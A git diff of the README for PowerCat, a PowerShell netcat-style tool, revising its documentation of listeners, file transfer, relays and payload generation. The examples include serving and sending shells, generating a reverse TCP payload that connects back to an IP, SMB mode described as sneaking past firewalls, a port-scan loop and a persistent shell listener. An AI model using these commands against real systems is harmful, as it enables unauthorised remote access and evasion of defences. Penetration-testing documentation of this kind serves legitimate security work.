@@ -1,53 +1,48 @@
 PowerCat
 ========
-```powershell
-Write-Warning 'PowerCat is under construction. Check back soon for updates.'
-Write-Warning 'I will remove this warning when the code is functional.'
-```
-A PowerShell TCP/IP swiss army knife that's interoperable with the original netcat.
+A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat.
 
 Installation
 ------------
-PowerCat is packaged as a PowerShell module.  First you need to import the module before you can use its functions.
+PowerCat is packaged as a PowerShell module.  You need to import the module to use its functions.
 ###
 ```powershell
     # Import the functions from downloaded psd1 File:
     Import-Module PowerCat.psd1
 ```
-### Parameters:
+### Functions & Parameters:
 ```powershell    
-    Start-PowerCat # Listener
+    Start-PowerCat # This starts a listener/server.
     
-    -Mode           # Defaults to Tcp, can also specify Udp or Smb        [String]
-    -Port           # The port to listen on.                              [Int]
-	-PipeName       # Name of pipe to listen on.                          [String]
+    -Mode           # Defaults to Tcp, can also specify Udp or Smb.
+    -Port           # The port to listen on.
+	-PipeName       # Name of pipe to listen on.
 	
-    -Relay          # Format: "<Mode>:<IP>:<Port/Pipe>"                   [String]
-    -Execute        # Execute a console process or powershell.            [Switch]
-    -SendFile       # Filepath of file to send.                           [String]
-    -ReceiveFile    # Filepath of file to be written.                     [String]
-    -Disconnect     # Disconnect after connecting.                        [Switch]
-    -KeepAlive      # Restart after disconnecting.                        [Switch]
-    -Timeout        # Timeout option. Default: 60                         [Int]
+    -Relay          # Format: "<Mode>:<IP>:<Port/PipeName>"
+    -Execute        # Execute a console process or powershell.
+    -SendFile       # Filepath of file to send.
+    -ReceiveFile    # Filepath of file to be written.
+    -Disconnect     # Disconnect after connecting.
+    -KeepAlive      # Restart after disconnecting.
+    -Timeout        # Timeout option. Default: 60 seconds
 	
-	Connect-PowerCat # Client
+	Connect-PowerCat # This connects a client to a listener/server.
 	
-    -Mode           # Defaults to Tcp, can also specify Udp or Smb        [String]
-	-RemoteIp       # IPv4 address of host to connect to.                 [String]
-    -Port           # The port to connect to.                             [Int]
-	-PipeName       # Name of pipe to connect to.                         [String]
+    -Mode           # Defaults to Tcp, can also specify Udp or Smb
+	-RemoteIp       # IPv4 address of host to connect to.
+    -Port           # The port to connect to.
+	-PipeName       # Name of pipe to connect to.
 	
-    -Relay          # Format: "<Mode>:<IP>:<Port/Pipe>"                   [String]
-    -Execute        # Execute a console process or powershell.            [Switch]
-    -SendFile       # Filepath of file to send.                           [String]
-    -ReceiveFile    # Filepath of file to be written.                     [String]
-    -Disconnect     # Disconnect after connecting.                        [Switch]
-    -KeepAlive      # Restart after disconnecting.                        [Switch]
-    -Timeout        # Timeout option. Default: 60                         [Int]
+    -Relay          # Format: "<Mode>:<IP>:<Port/PipeName>"
+    -Execute        # Execute a console process or powershell.
+    -SendFile       # Filepath of file to send.
+    -ReceiveFile    # Filepath of file to be written.
+    -Disconnect     # Disconnect after connecting.
+    -Timeout        # Timeout option. Default: 60 seconds
 ```
 Basic Connections
 -----------------------------------
-By default, PowerCat uses TCP and reads/writes from/to the console.
+By default, PowerCat uses TCP and reads from / writes to the console.
 ###
 ```powershell
     # Basic Listener:
@@ -64,12 +59,12 @@ PowerCat can be used to transfer files using the -SendFile and -ReceiveFile para
     # Send File:
     Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C:\pathto\inputfile
         
-    # Recieve File:
+    # Receive File:
     Start-PowerCat -Port 443 -ReceiveFile C:\pathto\outputfile
 ```
 Shells
 ------
-PowerCat can be used to send and serve shells using the -Execute parameter.
+PowerCat can be used to send and serve (Power)shells using the -Execute parameter.
 ###
 ```powershell
     # Serve a shell:
@@ -86,7 +81,7 @@ PowerCat supports more than sending data over TCP.
     # Send Data Over UDP:
     Start-PowerCat -Mode Udp -Port 8000
         
-    # Send Data Over SMB:
+    # Send Data Over SMB (easily sneak past firewalls):
     Start-PowerCat -Mode Smb -PipeName PowerCat
 ```
 Relays
@@ -108,14 +103,14 @@ Relays in PowerCat are similar to netcat relays, but you don't have to create a 
 ```
 Generate Payloads
 -----------------
-Payloads can be generated using New-PowerCatPayload. 
+Payloads can be generated using the New-PowerCatPayload function. 
 ###
 ```powershell
     # Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
-    New-PowerCatPayload -Client -RemoteIp 10.1.1.15 -Port 443 -Execute 
+    New-PowerCatPayload -RemoteIp 10.1.1.15 -Port 443 -Execute 
         
     # Generate a bind tcp encoded command which listens on port 8000:
-    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute
+    New-PowerCatPayload -Listener -Port 8000 -Execute
 ```
 Misc Usage
 ----------
@@ -129,5 +124,5 @@ PowerCat can also be used to perform port-scans, and start persistent listeners.
     1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose }
         
     # Persistent listener:
-    Start-PowerCat -Port 443 -SendFile C:\pathto\inputfile -KeepAlive
+    Start-PowerCat -Port 443 -Execute -KeepAlive
 ```
